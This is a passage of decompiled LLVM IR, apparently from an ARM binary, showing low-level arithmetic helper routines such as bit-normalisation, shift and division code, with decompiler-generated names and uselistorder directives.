  %v1_18da4 = phi i32 [ %storemerge, %bb105 ], [ %storemerge, %bb106 ], [ %v2_18d98, %bb107 ]
  %v1_18da0 = phi i32 [ %v1_18d94, %bb105 ], [ %v4_18d94, %bb106 ], [ %v4_18d94, %bb107 ]
  %v2_18d9c = icmp ugt i32 %v1_18da0, 15
  br i1 %v2_18d9c, label %bb108, label %.thread21

bb108:                                            ; preds = %.thread20
  %v2_18da0 = and i32 %v1_18da0, 8
  %v3_18da0 = icmp eq i32 %v2_18da0, 0
  %v4_18da0 = udiv i32 %v1_18da0, 16
  br i1 %v3_18da0, label %.thread21, label %bb109

bb109:                                            ; preds = %bb108
  %v2_18da4 = add nsw i32 %v1_18da4, 4
  br label %.thread21

.thread21:                                        ; preds = %bb108, %.thread20, %bb109
  %v4_18dac = phi i32 [ %v1_18da4, %.thread20 ], [ %v1_18da4, %bb108 ], [ %v2_18da4, %bb109 ]
  %v5_18db0 = phi i32 [ %v1_18da0, %.thread20 ], [ %v4_18da0, %bb108 ], [ %v4_18da0, %bb109 ]
  %v2_18da8 = icmp ugt i32 %v5_18db0, 3
  %v7_18da8 = icmp eq i32 %v5_18db0, 4
  %v2_18dac = xor i1 %v7_18da8, true
  %v3_18dac = and i1 %v2_18da8, %v2_18dac
  br i1 %v3_18dac, label %bb110, label %bb111

bb110:                                            ; preds = %.thread21
  %v5_18dac = add nsw i32 %v4_18dac, 3
  br label %bb111

bb111:                                            ; preds = %.thread21, %bb110
  %v4_18db0 = phi i32 [ %v4_18dac, %.thread21 ], [ %v5_18dac, %bb110 ]
  %v2_18db0 = xor i1 %v2_18da8, true
  %v3_18db0 = or i1 %v7_18da8, %v2_18db0
  br i1 %v3_18db0, label %bb112, label %bb113

bb112:                                            ; preds = %bb111
  %v8_18db0 = udiv i32 %v5_18db0, 2
  %v9_18db0 = add i32 %v4_18db0, %v8_18db0
  br label %bb113

bb113:                                            ; preds = %bb111, %bb112
  %v1_18db8 = phi i32 [ %v4_18db0, %bb111 ], [ %v9_18db0, %bb112 ]
  %v1_18db4 = icmp slt i32 %v2_18cb0, 0
  %v6_18db8 = lshr i32 %v0_18db8, %v1_18db8
  %v2_18dbc = sub i32 0, %v6_18db8
  %v2_18dbc.v6_18db8 = select i1 %v1_18db4, i32 %v2_18dbc, i32 %v6_18db8
  ret i32 %v2_18dbc.v6_18db8

dec_label_pc_18dc4:                               ; preds = %dec_label_pc_18cac
  %v0_18dc4 = load i32, i32* @lr, align 4
  %v0_18dc8 = call i32 @function_103e0()
  store i32 %v0_18dc4, i32* @lr, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_18db0, { 1, 0 }
  uselistorder i1 %v7_18da8, { 1, 0 }
  uselistorder i32 %v4_18da0, { 1, 0 }
  uselistorder i32 %v1_18da0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_18d94, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_18d94, { 1, 0, 2, 3 }
  uselistorder i32 %v4_18d84, { 1, 0 }
  uselistorder i32 %v0_18d48, { 1, 0 }
  uselistorder i32 %v4_18d3c, { 1, 0 }
  uselistorder i32 %v1_18d44, { 1, 2, 0 }
  uselistorder i32 %v4_18d30, { 1, 0 }
  uselistorder i32 %v1_18d38, { 1, 2, 0 }
  uselistorder i32 %v4_18d24, { 1, 0 }
  uselistorder i32 %v1_18d2c, { 1, 2, 0 }
  uselistorder i32 %v1_18d50, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_18d20, { 1, 0 }
  uselistorder i32 %v1_18d4c, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_18d0c, { 1, 0 }
  uselistorder i32 %v3_18d08, { 1, 0 }
  uselistorder i32 %v1_18d08, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_18d04, { 1, 0 }
  uselistorder i32 %v1_18d0c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_18cf8, { 1, 0 }
  uselistorder i32 %v4_18cf4, { 2, 1, 0 }
  uselistorder i32 %v1_18cf8, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_18d00.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_18ccc, { 1, 0 }
  uselistorder i32 %v1_18d84, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_18cb0, { 1, 0, 2 }
  uselistorder i32 %v0_18cb0, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 %v0_18cac, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @function_103e0, { 1, 0 }
  uselistorder label %bb113, { 1, 0 }
  uselistorder label %bb111, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_18d58, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_18d14, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18d00thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_18dd8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_18dd8:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_18ddc = call i32 @function_18cac()
  ret i32 %v0_18ddc

; uselistorder directives
  uselistorder i32 ()* @function_18cac, { 1, 2, 0 }
}

define i32 @function_18df0(i32 %arg1) local_unnamed_addr {
dec_label_pc_18df0:
  %v1_18df0 = sub i32 0, %arg1
  store i32 %v1_18df0, i32* @r1, align 4
  %v0_18df4 = call i32 @function_18dfc()
  ret i32 %v0_18df4
}

define i32 @function_18df8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_18df8:
  %v2_18df8 = load i32, i32* @r0, align 4
  ret i32 %v2_18df8
}

define i32 @function_18dfc() local_unnamed_addr {
dec_label_pc_18dfc:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18dfc = load i32, i32* @r4, align 4
  store i32 %v3_18dfc, i32* %stack_var_-12, align 4
  %v6_18dfc = load i32, i32* @r5, align 4
  %v9_18dfc = load i32, i32* @lr, align 4
  %v0_18e00 = load i32, i32* @r1, align 4
  %v2_18e00 = mul i32 %v0_18e00, 2
  store i32 %v2_18e00, i32* %r4.global-to-local, align 4
  %v0_18e04 = load i32, i32* @r3, align 4
  %v2_18e04 = mul i32 %v0_18e04, 2
  store i32 %v2_18e04, i32* %r5.global-to-local, align 4
  %v4_18e08 = icmp eq i32 %v2_18e04, %v2_18e00
  %v1_18e0c = load i32, i32* @r0, align 4
  br i1 %v4_18e08, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_18dfc
  %v2_18e0c = load i32, i32* @r2, align 4
  %v5_18e0c = icmp eq i32 %v2_18e0c, %v1_18e0c
  br i1 %v5_18e0c, label %.thread3, label %.thread

.thread:                                          ; preds = %dec_label_pc_18dfc, %bb
  %v3_18e10 = or i32 %v1_18e0c, %v2_18e00
  %v5_18e10 = icmp eq i32 %v3_18e10, 0
  br i1 %v5_18e10, label %.thread3, label %bb10

bb10:                                             ; preds = %.thread
  %v2_18e14 = load i32, i32* @r2, align 4
  %v3_18e14 = or i32 %v2_18e14, %v2_18e04
  %v5_18e14 = icmp eq i32 %v3_18e14, 0
  br i1 %v5_18e14, label %.thread3, label %bb11

bb11:                                             ; preds = %bb10
  %v2_18e00.off = add i32 %v2_18e00, 4194303
  %tmp = icmp ult i32 %v2_18e00.off, 2097152
  br i1 %tmp, label %.thread3, label %bb12

bb12:                                             ; preds = %bb11
  %v2_18e04.off = add i32 %v2_18e04, 4194303
  %tmp17 = icmp ult i32 %v2_18e04.off, 2097152
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb, %bb10, %bb11, %bb12
  %v0_18e20 = phi i1 [ true, %bb10 ], [ true, %bb11 ], [ %tmp17, %bb12 ], [ true, %bb ], [ true, %.thread ]
  call void @__pseudo_cond_branch(i1 %v0_18e20, i32 ptrtoint (i32* @global_var_19058.542 to i32))
  %v0_18e24 = load i32, i32* %r4.global-to-local, align 4
  %v3_18e24 = udiv i32 %v0_18e24, 2097152
  store i32 %v3_18e24, i32* %r4.global-to-local, align 4
  %v1_18e28 = load i32, i32* %r5.global-to-local, align 4
  %v4_18e28 = udiv i32 %v1_18e28, 2097152
  %v5_18e28 = sub nsw i32 %v4_18e28, %v3_18e24
  %v5_18e2c = icmp ult i32 %v4_18e28, %v3_18e24
  br i1 %v5_18e2c, label %bb13, label %bb14

bb13:                                             ; preds = %.thread3
  %v7_18e2c = sub nsw i32 0, %v5_18e28
  br label %bb14

bb14:                                             ; preds = %.thread3, %bb13
  %storemerge = phi i32 [ %v7_18e2c, %bb13 ], [ %v5_18e28, %.thread3 ]
  %v0_18e50 = phi i32 [ %v7_18e2c, %bb13 ], [ %v5_18e28, %.thread3 ]
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v7_18e30 = icmp ugt i32 %v4_18e28, %v3_18e24
  br i1 %v7_18e30, label %dec_label_pc_18e34, label %dec_label_pc_18e50

dec_label_pc_18e34:                               ; preds = %bb14
  %v2_18e34 = add nsw i32 %v0_18e50, %v3_18e24
  store i32 %v2_18e34, i32* %r4.global-to-local, align 4
  %v0_18e38 = load i32, i32* @r0, align 4
  %v1_18e38 = load i32, i32* @r2, align 4
  %v0_18e3c = load i32, i32* @r1, align 4
  %v1_18e3c = load i32, i32* @r3, align 4
  store i32 %v1_18e38, i32* @r0, align 4
  store i32 %v1_18e3c, i32* @r1, align 4
  store i32 %v0_18e38, i32* @r2, align 4
  store i32 %v0_18e3c, i32* @r3, align 4
  br label %dec_label_pc_18e50

dec_label_pc_18e50:                               ; preds = %bb14, %dec_label_pc_18e34
  %tmp18 = icmp ugt i32 %v0_18e50, 54
  br i1 %tmp18, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_18e50
  %v6_18e54 = load i32, i32* %stack_var_-12, align 4
  store i32 %v6_18e54, i32* %r4.global-to-local, align 4
  store i32 %v6_18dfc, i32* %r5.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_18e50, %bb15
  call void @__pseudo_cond_branch(i1 %tmp18, i32 %v9_18dfc)
  %v0_18e5c = load i32, i32* @r1, align 4
  %v3_18e5c = icmp sgt i32 %v0_18e5c, -1
  br i1 %v3_18e5c, label %dec_label_pc_18e78, label %dec_label_pc_18e70

dec_label_pc_18e70:                               ; preds = %bb16
  %v0_18e70 = load i32, i32* @r0, align 4
  %v1_18e70 = sub i32 0, %v0_18e70
  store i32 %v1_18e70, i32* @r0, align 4
  br label %dec_label_pc_18e78

dec_label_pc_18e78:                               ; preds = %bb16, %dec_label_pc_18e70
  %v0_18e78 = load i32, i32* @r3, align 4
  %v3_18e78 = icmp sgt i32 %v0_18e78, -1
  br i1 %v3_18e78, label %dec_label_pc_18e90, label %dec_label_pc_18e88

dec_label_pc_18e88:                               ; preds = %dec_label_pc_18e78
  br label %dec_label_pc_18e90

dec_label_pc_18e90:                               ; preds = %dec_label_pc_18e78, %dec_label_pc_18e88
  %v0_18e90 = load i32, i32* %r4.global-to-local, align 4
  %v1_18e90 = load i32, i32* %r5.global-to-local, align 4
  %v4_18e90 = icmp eq i32 %v1_18e90, %v0_18e90
  call void @__pseudo_cond_branch(i1 %v4_18e90, i32 ptrtoint (i32* @global_var_19040.543 to i32))
  %v1_18e94 = load i32, i32* @r0, align 4
  ret i32 %v1_18e94

; uselistorder directives
  uselistorder i1 %tmp18, { 1, 0 }
  uselistorder i32 %v4_18e28, { 2, 1, 0 }
  uselistorder i32 %v3_18e24, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_18e0c, { 1, 0 }
  uselistorder i32 %v2_18e04, { 1, 3, 0, 2 }
  uselistorder i32 %v2_18e00, { 1, 3, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_18e90, { 1, 0 }
  uselistorder label %dec_label_pc_18e78, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_18e50, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread3, { 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_18e98() local_unnamed_addr {
dec_label_pc_18e98:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v0_18e98 = load i32, i32* @r4, align 4
  %v1_18e98 = add i32 %v0_18e98, -1
  store i32 %v1_18e98, i32* @r4, align 4
  %v0_18e9c = load i32, i32* @r5, align 4
  %v1_18e9c = sub i32 32, %v0_18e9c
  store i32 %v1_18e9c, i32* @lr, align 4
  %v5_18ea0 = icmp sgt i32 %v0_18e9c, 32
  br i1 %v5_18ea0, label %dec_label_pc_18ebc, label %dec_label_pc_18ea4

dec_label_pc_18ea4:                               ; preds = %dec_label_pc_18e98
  %v0_18ea4 = load i32, i32* @r2, align 4
  %v6_18ea4 = shl i32 %v0_18ea4, %v1_18e9c
  store i32 %v6_18ea4, i32* %ip.global-to-local, align 4
  %v0_18ea8 = load i32, i32* @r0, align 4
  %v3_18ea8 = add i32 %v0_18e9c, -1
  %v4_18ea8 = shl i32 1, %v3_18ea8
  %v7_18ea8 = lshr i32 %v0_18ea4, %v0_18e9c
  %v8_18ea8 = add i32 %v0_18ea8, %v7_18ea8
  %v9_18ea8 = icmp ult i32 %v8_18ea8, %v0_18ea8
  %v0_18eac = load i32, i32* @r1, align 4
  %v2_18eac = zext i1 %v9_18ea8 to i32
  %v3_18eac = add i32 %v2_18eac, %v0_18eac
  %v1_18eb0 = load i32, i32* @r3, align 4
  %v7_18eb0 = shl i32 %v1_18eb0, %v1_18e9c
  %v8_18eb0 = add i32 %v7_18eb0, %v8_18ea8
  store i32 %v8_18eb0, i32* %r0.global-to-local, align 4
  %v5_18eb4 = and i32 %v1_18eb0, %v4_18ea8
  %v6_18eb4 = icmp ne i32 %v5_18eb4, 0
  %v7_18eb4 = ashr i32 %v1_18eb0, %v0_18e9c
  %v9_18eb4 = add i32 %v3_18eac, %v7_18eb4
  %v10_18eb4 = zext i1 %v6_18eb4 to i32
  %v11_18eb4 = add i32 %v10_18eb4, %v9_18eb4
  br label %dec_label_pc_18ed8

dec_label_pc_18ebc:                               ; preds = %dec_label_pc_18e98
  %v1_18ebc = add i32 %v0_18e9c, -32
  %v1_18ec0 = add i32 %v1_18e9c, 32
  store i32 %v1_18ec0, i32* @lr, align 4
  %v0_18ec8 = load i32, i32* @r3, align 4
  %v2_18ec8 = add i32 %v1_18e9c, 31
  %v3_18ec8 = lshr i32 -2147483648, %v2_18ec8
  %v4_18ec8 = and i32 %v0_18ec8, %v3_18ec8
  %v5_18ec8 = icmp ne i32 %v4_18ec8, 0
  %v6_18ec8 = shl i32 %v0_18ec8, %v1_18ec0
  %v2_18ecc = or i32 %v6_18ec8, 2
  %v2_18ecc.v6_18ec8 = select i1 %v5_18ec8, i32 %v2_18ecc, i32 %v6_18ec8
  store i32 %v2_18ecc.v6_18ec8, i32* %ip.global-to-local, align 4
  %v0_18ed0 = load i32, i32* @r0, align 4
  %v7_18ed0 = ashr i32 %v0_18ec8, %v1_18ebc
  %v8_18ed0 = add i32 %v0_18ed0, %v7_18ed0
  store i32 %v8_18ed0, i32* %r0.global-to-local, align 4
  %v0_18ed4 = load i32, i32* @r1, align 4
  %v2_18ed4 = and i32 %v0_18ec8, 1073741824
  %v3_18ed4 = icmp ne i32 %v2_18ed4, 0
  %v4_18ed4 = ashr i32 %v0_18ec8, 31
  %v6_18ed4 = add i32 %v0_18ed4, %v4_18ed4
  %v7_18ed4 = zext i1 %v3_18ed4 to i32
  %v8_18ed4 = add i32 %v6_18ed4, %v7_18ed4
  br label %dec_label_pc_18ed8

dec_label_pc_18ed8:                               ; preds = %dec_label_pc_18ea4, %dec_label_pc_18ebc
  %storemerge = phi i32 [ %v11_18eb4, %dec_label_pc_18ea4 ], [ %v8_18ed4, %dec_label_pc_18ebc ]
  %v0_18ed8 = phi i32 [ %v11_18eb4, %dec_label_pc_18ea4 ], [ %v8_18ed4, %dec_label_pc_18ebc ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_18ed8 = and i32 %v0_18ed8, -2147483648
  store i32 %v1_18ed8, i32* @r5, align 4
  %v1_18edc = icmp sgt i32 %v0_18ed8, -1
  call void @__pseudo_cond_branch(i1 %v1_18edc, i32 ptrtoint (i32* @global_var_18eec.544 to i32))
  %v0_18ee0 = load i32, i32* %ip.global-to-local, align 4
  %v1_18ee0 = sub i32 0, %v0_18ee0
  store i32 %v1_18ee0, i32* %ip.global-to-local, align 4
  %v2_18ee0 = icmp eq i32 %v0_18ee0, 0
  %v0_18ee4 = load i32, i32* %r0.global-to-local, align 4
  %v2_18ee4 = icmp eq i1 %v2_18ee0, false
  %v5_18ee4 = sext i1 %v2_18ee4 to i32
  %v6_18ee4 = sub i32 %v5_18ee4, %v0_18ee4
  store i32 %v6_18ee4, i32* %r0.global-to-local, align 4
  %v7_18ee4 = zext i1 %v2_18ee4 to i32
  %v8_18ee4 = icmp ne i32 %v6_18ee4, %v7_18ee4
  %v9_18ee4 = icmp ne i32 %v0_18ee4, -1
  %v10_18ee4 = or i1 %v9_18ee4, %v8_18ee4
  %v11_18ee4 = icmp ne i32 %v0_18ee4, 0
  %v12_18ee4 = select i1 %v2_18ee4, i1 %v10_18ee4, i1 %v11_18ee4
  %v0_18ee8 = load i32, i32* %r1.global-to-local, align 4
  %v5_18ee8 = sext i1 %v12_18ee4 to i32
  %v6_18ee8 = sub i32 %v5_18ee8, %v0_18ee8
  store i32 %v6_18ee8, i32* @r1, align 4
  ret i32 %v6_18ee4

; uselistorder directives
  uselistorder i1 %v2_18ee4, { 1, 2, 0 }
  uselistorder i32 %v0_18ee4, { 1, 2, 0 }
  uselistorder i32 %v8_18ed4, { 1, 0 }
  uselistorder i32 %v0_18ec8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v11_18eb4, { 1, 0 }
  uselistorder i32 %v1_18eb0, { 1, 0, 2 }
  uselistorder i32 %v0_18ea8, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_18ed8, { 1, 0 }
}

define i32 @function_18eec(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_18eec:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = trunc i64 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_18eec = load i32, i32* %r1.global-to-local, align 4
  %v3_18ef0 = icmp ult i32 %v0_18eec, 1048574
  br i1 %v3_18ef0, label %dec_label_pc_18f34, label %dec_label_pc_18ef4

dec_label_pc_18ef4:                               ; preds = %dec_label_pc_18eec
  %v3_18ef8 = icmp ult i32 %v0_18eec, 2097150
  br i1 %v3_18ef8, label %dec_label_pc_18f18, label %dec_label_pc_18efc

dec_label_pc_18efc:                               ; preds = %dec_label_pc_18ef4
  %v1_18efc = urem i32 %v0_18eec, 2
  %v2_18efc = icmp ne i32 %v1_18efc, 0
  %v3_18efc = udiv i32 %v0_18eec, 2
  store i32 %v3_18efc, i32* %r1.global-to-local, align 4
  %v0_18f00 = load i32, i32* %r0.global-to-local, align 4
  %v3_18f00 = zext i1 %v2_18efc to i32
  %v6_18f00 = zext i32 %v0_18f00 to i64
  %v7_18f00 = sub i32 33, %v0_18f00
  %v8_18f00 = zext i32 %v7_18f00 to i64
  %v9_18f00 = shl i64 %v6_18f00, %v8_18f00
  %v10_18f00 = sub i32 32, %v0_18f00
  %v11_18f00 = shl i32 %v3_18f00, %v10_18f00
  %v12_18f00 = zext i32 %v11_18f00 to i64
  %v14_18f00 = or i64 %v12_18f00, %v9_18f00
  %v15_18f00 = trunc i64 %v14_18f00 to i32
  %v16_18f00 = add i32 %v0_18f00, -1
  %v17_18f00 = shl i32 1, %v16_18f00
  %v18_18f00 = and i32 %v17_18f00, %v0_18f00
  %v19_18f00 = icmp ne i32 %v18_18f00, 0
  store i32 %v15_18f00, i32* %r0.global-to-local, align 4
  %v0_18f04 = load i32, i32* @ip, align 4
  %v3_18f04 = zext i1 %v19_18f00 to i32
  %v6_18f04 = zext i32 %v0_18f04 to i64
  %v7_18f04 = sub i32 33, %v0_18f04
  %v8_18f04 = zext i32 %v7_18f04 to i64
  %v9_18f04 = shl i64 %v6_18f04, %v8_18f04
  %v10_18f04 = sub i32 32, %v0_18f04
  %v11_18f04 = shl i32 %v3_18f04, %v10_18f04
  %v12_18f04 = zext i32 %v11_18f04 to i64
  %v14_18f04 = or i64 %v12_18f04, %v9_18f04
  %v15_18f04 = trunc i64 %v14_18f04 to i32
  store i32 %v15_18f04, i32* @ip, align 4
  %v0_18f08 = load i32, i32* @r4, align 4
  %v1_18f08 = add i32 %v0_18f08, 1
  store i32 %v1_18f08, i32* @r4, align 4
  %v3_18f0c = mul i32 %v1_18f08, 2097152
  %v2_18f10 = icmp ugt i32 %v3_18f0c, -4194305
  call void @__pseudo_cond_branch(i1 %v2_18f10, i32 ptrtoint (i32* @global_var_190c8.545 to i32))
  br label %dec_label_pc_18f18

dec_label_pc_18f18:                               ; preds = %dec_label_pc_18f34, %dec_label_pc_18ef4, %dec_label_pc_18efc
  %v0_18f18 = load i32, i32* @ip, align 4
  %v2_18f18 = icmp slt i32 %v0_18f18, 0
  %v6_18f18 = icmp eq i32 %v0_18f18, -2147483648
  %v1_18f1c = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_18f18, label %bb, label %dec_label_pc_18f18._crit_edge

bb:                                               ; preds = %dec_label_pc_18f18
  %v2_18f1c = urem i32 %v1_18f1c, 2
  %v3_18f1c = icmp ne i32 %v2_18f1c, 0
  br label %dec_label_pc_18f18._crit_edge

dec_label_pc_18f18._crit_edge:                    ; preds = %dec_label_pc_18f18, %bb
  %v1_18f20 = phi i1 [ %v3_18f1c, %bb ], [ %v2_18f18, %dec_label_pc_18f18 ]
  %v2_18f20 = zext i1 %v1_18f20 to i32
  %v3_18f20 = add i32 %v2_18f20, %v1_18f1c
  store i32 %v3_18f20, i32* %r0.global-to-local, align 4
  %v0_18f24 = load i32, i32* %r1.global-to-local, align 4
  %v1_18f24 = load i32, i32* @r4, align 4
  %v2_18f24 = and i32 %v1_18f24, 4096
  %v3_18f24 = icmp ne i32 %v2_18f24, 0
  %v4_18f24 = mul i32 %v1_18f24, 1048576
  %v6_18f24 = add i32 %v4_18f24, %v0_18f24
  %v7_18f24 = zext i1 %v3_18f24 to i32
  %v8_18f24 = add i32 %v7_18f24, %v6_18f24
  %v1_18f28 = load i32, i32* @r5, align 4
  %v2_18f28 = or i32 %v1_18f28, %v8_18f24
  store i32 %v2_18f28, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  ret i32 %v3_18f20

dec_label_pc_18f34:                               ; preds = %dec_label_pc_18eec
  %v0_18f34 = load i32, i32* @ip, align 4
  %v1_18f34 = icmp slt i32 %v0_18f34, 0
  %v2_18f34 = mul i32 %v0_18f34, 2
  store i32 %v2_18f34, i32* @ip, align 4
  %v0_18f38 = load i32, i32* %r0.global-to-local, align 4
  %v3_18f38 = mul i32 %v0_18f38, 2
  %v4_18f38 = zext i1 %v1_18f34 to i32
  %v5_18f38 = or i32 %v3_18f38, %v4_18f38
  store i32 %v5_18f38, i32* %r0.global-to-local, align 4
  %v9_18f38 = icmp ule i32 %v5_18f38, %v0_18f38
  %v10_18f38 = icmp ult i32 %v3_18f38, %v0_18f38
  %v11_18f38 = select i1 %v1_18f34, i1 %v9_18f38, i1 %v10_18f38
  %v3_18f3c = mul i32 %v0_18eec, 2
  %v4_18f3c = zext i1 %v11_18f38 to i32
  %v5_18f3c = or i32 %v4_18f3c, %v3_18f3c
  store i32 %v5_18f3c, i32* %r1.global-to-local, align 4
  %v1_18f40 = and i32 %v3_18f3c, 1048576
  %v2_18f40 = icmp eq i32 %v1_18f40, 0
  %v0_18f44 = load i32, i32* @r4, align 4
  %v1_18f44 = add i32 %v0_18f44, -1
  store i32 %v1_18f44, i32* @r4, align 4
  br i1 %v2_18f40, label %bb7, label %dec_label_pc_18f18

bb7:                                              ; preds = %dec_label_pc_18f34
  ret i32 %v5_18f38

; uselistorder directives
  uselistorder i32 %v0_18f38, { 1, 2, 0 }
  uselistorder i1 %v1_18f34, { 1, 0 }
  uselistorder i32 %v1_18f1c, { 1, 0 }
  uselistorder i32 %v0_18f18, { 1, 0 }
  uselistorder i32 %v0_18f04, { 1, 0, 2 }
  uselistorder i32 %v0_18f00, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_18f18._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_18f18, { 0, 2, 1 }
}

define i32 @function_18f4c() local_unnamed_addr {
dec_label_pc_18f4c:
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i32, align 4
  %v0_18f4c = load i32, i32* @r1, align 4
  %v2_18f4c = icmp eq i32 %v0_18f4c, 0
  br i1 %v2_18f4c, label %bb38, label %bb

bb:                                               ; preds = %dec_label_pc_18f4c
  br label %.thread

bb38:                                             ; preds = %dec_label_pc_18f4c
  %v1_18f5810 = load i32, i32* @r0, align 4
  store i32 %v1_18f5810, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %bb38
  %v0_18fb4 = phi i32 [ %v0_18f4c, %bb ], [ %v1_18f5810, %bb38 ]
  %v1_18f6c = phi i32 [ 20, %bb ], [ 52, %bb38 ]
  %v2_18f64 = icmp ugt i32 %v0_18fb4, 65535
  br i1 %v2_18f64, label %bb39, label %.thread3

bb39:                                             ; preds = %.thread
  %v2_18f68 = and i32 %v0_18fb4, 32768
  %v3_18f68 = icmp eq i32 %v2_18f68, 0
  %v4_18f68 = udiv i32 %v0_18fb4, 65536
  br i1 %v3_18f68, label %.thread3, label %bb40

bb40:                                             ; preds = %bb39
  %v2_18f6c = add nsw i32 %v1_18f6c, -16
  br label %.thread3

.thread3:                                         ; preds = %bb39, %.thread, %bb40
  %v1_18f78 = phi i32 [ %v1_18f6c, %.thread ], [ %v1_18f6c, %bb39 ], [ %v2_18f6c, %bb40 ]
  %v1_18f74 = phi i32 [ %v0_18fb4, %.thread ], [ %v4_18f68, %bb39 ], [ %v4_18f68, %bb40 ]
  %v2_18f70 = icmp ugt i32 %v1_18f74, 255
  br i1 %v2_18f70, label %bb41, label %.thread4

bb41:                                             ; preds = %.thread3
  %v2_18f74 = and i32 %v1_18f74, 128
  %v3_18f74 = icmp eq i32 %v2_18f74, 0
  %v4_18f74 = udiv i32 %v1_18f74, 256
  br i1 %v3_18f74, label %.thread4, label %bb42

bb42:                                             ; preds = %bb41
  %v2_18f78 = add nsw i32 %v1_18f78, -8
  br label %.thread4

.thread4:                                         ; preds = %bb41, %.thread3, %bb42
  %v1_18f84 = phi i32 [ %v1_18f78, %.thread3 ], [ %v1_18f78, %bb41 ], [ %v2_18f78, %bb42 ]
  %v1_18f80 = phi i32 [ %v1_18f74, %.thread3 ], [ %v4_18f74, %bb41 ], [ %v4_18f74, %bb42 ]
  %v2_18f7c = icmp ugt i32 %v1_18f80, 15
  br i1 %v2_18f7c, label %bb43, label %.thread5

bb43:                                             ; preds = %.thread4
  %v2_18f80 = and i32 %v1_18f80, 8
  %v3_18f80 = icmp eq i32 %v2_18f80, 0
  %v4_18f80 = udiv i32 %v1_18f80, 16
  br i1 %v3_18f80, label %.thread5, label %bb44

bb44:                                             ; preds = %bb43
  %v2_18f84 = add nsw i32 %v1_18f84, -4
  br label %.thread5

.thread5:                                         ; preds = %bb43, %.thread4, %bb44
  %v1_18f8c = phi i32 [ %v1_18f84, %.thread4 ], [ %v1_18f84, %bb43 ], [ %v2_18f84, %bb44 ]
  %v1_18f94 = phi i32 [ %v1_18f80, %.thread4 ], [ %v4_18f80, %bb43 ], [ %v4_18f80, %bb44 ]
  %v2_18f88 = icmp ugt i32 %v1_18f94, 3
  br i1 %v2_18f88, label %bb45, label %.thread6

bb45:                                             ; preds = %.thread5
  %v2_18f8c = add i32 %v1_18f8c, -2
  br label %bb46

.thread6:                                         ; preds = %.thread5
  %v5_18f90 = udiv i32 %v1_18f94, 2
  %v6_18f90 = sub i32 %v1_18f8c, %v5_18f90
  br label %bb46

